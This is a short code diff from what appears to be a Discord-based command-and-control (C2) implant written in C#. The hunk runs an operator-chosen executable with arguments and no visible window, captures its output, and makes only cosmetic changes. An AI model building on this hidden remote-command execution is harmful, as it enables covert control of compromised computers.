@@ -62,7 +62,6 @@ namespace DiscordC2;
         {
             try
             {
-
                 var start = new ProcessStartInfo
                 {
                     FileName = $"{taskType}.exe",
@@ -70,15 +69,12 @@ namespace DiscordC2;
                     Arguments = "" + args,
                     CreateNoWindow = true
                 };
-
                 using var process = Process.Start(start);
                 using var reader = process!.StandardOutput;
-
                 process.EnableRaisingEvents = true;
 
                 var lineData = await reader.ReadToEndAsync();
-                var items = lineData.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
-
+                var items = lineData.Split(new[] { Environment.NewLine });
                 StringBuilder builder = new();
                 foreach (var item in items) {
                     builder.AppendLine(item);
